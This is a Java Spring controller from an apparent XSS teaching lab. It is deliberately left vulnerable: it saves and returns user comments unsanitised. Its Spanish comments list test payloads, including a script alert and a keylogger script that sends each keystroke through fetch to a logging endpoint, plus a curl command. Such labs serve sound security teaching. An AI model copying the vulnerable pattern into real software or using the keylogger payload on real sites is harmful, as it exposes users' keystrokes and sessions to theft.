package com.example.xssdemo.controller;

import com.example.xssdemo.model.Comment;
import com.example.xssdemo.service.CommentService;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;

/**
 * Controlador Vulnerable a XSS (Cross-Site Scripting).
 * NO sanitiza las entradas del cliente ni escapa la salida.
 * Si se envía un script malicioso como un Keylogger, este se guarda tal cual en
 * la BD
 * y se sirve en crudo al cliente, provocando que el navegador lo ejecute.
 */
@RestController
@RequestMapping("/api/vulnerable/comments")
@CrossOrigin(origins = "*")
public class VulnerableCommentController {

    private final CommentService commentService;

    public VulnerableCommentController(CommentService commentService) {
        this.commentService = commentService;
    }

    @GetMapping
    public ResponseEntity<List<Comment>> getComments() {
        return ResponseEntity.ok(commentService.getVulnerableComments());
    }

    @PostMapping
    public ResponseEntity<Comment> createComment(@RequestBody Comment comment) {
        Comment savedComment = commentService.saveVulnerable(comment);
        return ResponseEntity.status(HttpStatus.CREATED).body(savedComment);
    }
}

/*
 * PRUEBAS DE INYECCIÓN XSS EN ESTE CONTROLADOR DESDE BRUNO / POSTMAN / CURL:
 *
 * 1. Estructura de la Petición HTTP (POST):
 * - Método: POST
 * - URL: http://localhost:8080/api/vulnerable/comments
 * - Header: Content-Type: application/json
 *
 * 2. Ejemplos de Payloads de Prueba en JSON:
 *
 * A. Inyección HTML Básica:
 * {
 * "author": "Usuario Prueba",
 * "content": "<h1 style='color:red;'>⚠️ Comentario Inyectado</h1>"
 * }
 *
 * B. Prueba de Concepto XSS Estándar (alert):
 * {
 * "author": "Atacante XSS",
 * "content": "<script>alert('Vulnerabilidad XSS detectada');</script>"
 * }
 *
 * C. Payload de Keylogger (Demostración del laboratorio):
 * {
 * "author": "Atacante Keylogger",
 * "content":
 * "<script>document.addEventListener('keydown', function(e){ fetch('/api/keylogger/log?key=' + encodeURIComponent(e.key)); });</script><p>Comentario normal</p>"
 * }
 *
 * 3. Comando cURL de ejemplo:
 * curl -X POST http://localhost:8080/api/vulnerable/comments \
 * -H "Content-Type: application/json" \
 * -d '{"author": "Atacante XSS", "content":
 * "<script>alert(\"XSS desde cURL\");</script>"}'
 */
